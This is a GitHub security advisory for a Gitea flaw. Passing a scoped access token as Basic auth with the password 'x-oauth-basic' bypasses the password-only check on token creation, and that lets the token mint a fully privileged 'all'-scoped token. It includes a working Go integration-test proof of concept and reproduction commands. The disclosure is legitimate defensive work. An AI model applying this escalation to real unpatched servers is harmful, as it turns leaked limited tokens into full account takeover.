# [H] Gitea: Privilege Escalation via Access Token Scope Escalation in API

## Summary
Severity: High
Advisory: GHSA-683j-3ff6-hh2x
CVE: CVE-2026-56654
CWE: CWE-287
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-07-21
Source: https://github.com/advisories/GHSA-683j-3ff6-hh2x
Type: github-advisory

## Affected
- Go: `code.gitea.io/gitea` — affected >=0 <1.27.0

## Details
Gitea's API endpoint for creating Personal Access Tokens (`POST /users/{username}/tokens`) is protected by a middleware (`reqBasicOrRevProxyAuth`) that is intended to require password-based authentication, preventing a compromised token from being used to mint new ones. However, when a token is passed in the `Authorization: Basic <token>:x-oauth-basic` format, the Basic auth handler validates it and sets `AuthedMethod="basic"`, causing `IsBasicAuth=true` and fooling the middleware into passing the request. Once past the guard, the token creation handler applies no scope ceiling — it will create a new token with any requested scope regardless of the caller's scope. An attacker with a restricted token (e.g. `write:user` from a leaked CI secret) can therefore create a fully-privileged `all`-scoped token without knowing the account password.

### Data flow

#### Step 1 - Token extracted from Basic auth header
  
When the attacker sends Authorization: Basic base64(<token>:x-oauth-basic), parseAuthBasic detects that the password is "x-oauth-basic" and treats the username field as the token:

https://github.com/go-gitea/gitea/blob/9155a81b9daf1d46b2380aa91271e623ac947c1e/services/auth/basic.go#L55-L64

`VerifyAuthToken` then validates the token against the database and sets `LoginMethod = "access_token"` and `ApiTokenScope` to the token's actual scope (`write:user`):

https://github.com/go-gitea/gitea/blob/9155a81b9daf1d46b2380aa91271e623ac947c1e/services/auth/basic.go#L100-L106

#### Step 2 - `AuthedMethod` is set to `"basic"`, not `"access_token"`

`Basic.Verify()` returns the user successfully, so `group.Verify()` sets `AuthedMethod` to the method's name — `"basic"` — regardless of whether a password or token was used:

https://github.com/go-gitea/gitea/blob/9155a81b9daf1d46b2380aa91271e623ac947c1e/services/auth/group.go#L63-L65

#### Step 3 - `IsBasicAuth` is incorrectly set to true

`AuthShared` computes `IsBasicAuth` by comparing `AuthedMethod` against the constant `"basic"`. Since step 2 set that field to "basic" for a token-authenticated request, the flag is wrong:

https://github.com/go-gitea/gitea/blob/9155a81b9daf1d46b2380aa91271e623ac947c1e/routers/common/auth.go#L27

#### Step 4 - The guard is bypassed

`reqBasicOrRevProxyAuth` checks only `ctx.IsBasicAuth`. Because that flag is `true`, the middleware passes and the request reaches `CreateAccessToken`:

https://github.com/go-gitea/gitea/blob/9155a81b9daf1d46b2380aa91271e623ac947c1e/routers/api/v1/api.go#L392-L401

#### Step 5 - No scope ceiling in the handler

`CreateAccessToken` normalizes the caller-supplied scope and assigns it directly to the new token. There is no check that the requested scope is a subset of `ApiTokenScope (write:user)`:

https://github.com/go-gitea/gitea/blob/9155a81b9daf1d46b2380aa91271e623ac947c1e/routers/api/v1/user/app.go#L119-L128

### Reproducing

`tests/integration/api_token_scope_escalation_test.go`
```go
package integration

import (
	"net/http"
	"testing"

	auth_model "gitea.dev/models/auth"
	"gitea.dev/models/unittest"
	user_model "gitea.dev/models/user"
	api "gitea.dev/modules/structs"
	"gitea.dev/tests"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// TestAPIPrivilegeEscalationViaBasicAuthToken is a proof-of-concept for two
// interconnected vulnerabilities that together allow full scope escalation:
//
//  1. reqBasicOrRevProxyAuth() is fooled into passing when a PAT is supplied in
//     the Authorization: Basic "<token>:x-oauth-basic" format. The Basic auth
//     handler sets AuthedMethod="basic" (the method name), so IsBasicAuth=true
//     even though the credential is a token, not a password.
//
//  2. CreateAccessToken performs no scope-ceiling check — it never verifies that
//     the requested scopes are a subset of the caller's token scopes.
//
// Combined effect: an attacker with a write:user-scoped token can create a new
// token with the "all" scope, gaining full access to the account.
func TestAPIPrivilegeEscalationViaBasicAuthToken(t *testing.T) {
	defer tests.PrepareTestEnv(t)()

	// Non-admin user — escalation is meaningful and not trivially justified.
	user := unittest.AssertExistsAndLoadBean(t, &user_model.User{ID: 2})

	// Step 1 — Obtain a legitimately restricted token via password-based Basic auth.
	// Only write:user scope is granted; repository, admin, etc. are excluded.
	restrictedToken := createAPIAccessTokenWithoutCleanUp(t, "poc-restricted", user,
		[]auth_model.AccessTokenScope{auth_model.AccessTokenScopeWriteUser})
	defer deleteAPIAccessToken(t, restrictedToken, user)

	// Confirm the restricted token is blocked from repository-scoped endpoints.
	// This establishes the baseline: write:user does not imply read:repository.
	req := NewRequest(t, "GET", "/api/v1/repos/search").
		AddTokenAuth(restrictedToken.Token)
	MakeRequest(t, req, http.StatusForbidden)

	// Step 2 — Exploit: supply the restricted token as Basic auth credentials.
	// Authorization: Basic base64("<token>:x-oauth-basic")
	//
	// Basic.Verify() validates the token and returns the user. group.Verify() then
	// sets AuthedMethod="basic" (the method name). auth.go maps that to
	// IsBasicAuth=true, satisfying reqBasicOrRevProxyAuth() even though no
	// password was provided. CreateAccessToken then creates the token with the
	// requested "all" scope without checking whether it exceeds the caller's scope.
	payload := map[string]any{
		"name":   "poc-escalated",
		"scopes": []string{"all"},
	}
	req = NewRequestWithJSON(t, "POST", "/api/v1/users/"+user.LoginName+"/tokens", payload)
	req.SetBasicAuth(restrictedToken.Token, "x-oauth-basic")

	// This should be 403 (scope ceiling not enforced and IsBasicAuth check bypassed)
	// but is currently 201, confirming the vulnerability.
	resp := MakeRequest(t, req, http.StatusCreated)

	escalatedToken := DecodeJSON(t, resp, &api.AccessToken{})
	require.NotNil(t, escalatedToken)
	defer deleteAPIAccessToken(t, *escalatedToken, user)

	// Step 3 — The escalated token carries the "all" scope.
	assert.Contains(t, escalatedToken.Scopes, "all",
		"escalated token scope must be 'all'; original token only had write:user")

	// Step 4 — The escalated token can now reach endpoints blocked to the original
	// token, confirming real privilege gain beyond write:user.
	req = NewRequest(t, "GET", "/api/v1/repos/search").
		AddTokenAuth(escalatedToken.Token)
	MakeRequest(t, req, http.StatusOK)
}
```

```bash
git clone https://github.com/go-gitea/gitea
cd gitea
git checkout 9155a81b9daf1d46b2380aa91271e623ac947c1e

# Place the unit test above at `tests/integration/api_token_scope_escalation_test.go`.

go test -run '^TestAPIPrivilegeEscalationViaBasicAuthToken$' ./tests/integration/
```

A passing result confirms the vulnerability. The test output will show the two critical lines: the exploit POST returning 201 Created and the follow-up GET /api/v1/repos/search returning 200 OK with the escalated token.

## References
- https://github.com/go-gitea/gitea/security/advisories/GHSA-683j-3ff6-hh2x
- https://github.com/go-gitea/gitea/pull/38406
- https://github.com/go-gitea/gitea/pull/38426
- https://github.com/go-gitea/gitea/commit/de4b8277e9cb576f2315fb03b5ab6478b42a1d31
- https://github.com/go-gitea/gitea/commit/f69e15afe7496cc62e96dab244629c69eb31a7bf
- https://github.com/go-gitea/gitea
- https://github.com/go-gitea/gitea/releases/tag/v1.27.0
